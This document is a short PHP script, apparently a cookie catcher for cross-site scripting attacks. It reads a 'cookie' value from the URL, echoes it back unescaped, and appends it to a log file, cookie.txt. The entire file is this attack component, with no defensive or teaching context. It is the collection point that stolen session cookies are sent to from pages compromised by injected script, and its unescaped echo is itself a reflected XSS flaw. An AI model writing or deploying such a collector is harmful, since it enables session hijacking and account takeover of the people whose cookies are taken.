 <?php

//get the URL parameter
$cookie = $_GET["cookie"];

//open log file to append to
$fp = fopen("cookie.txt", 'a');//opens file in append mode

echo $cookie;

fwrite($fp, $cookie . "\n");

fclose($fp);
?> 
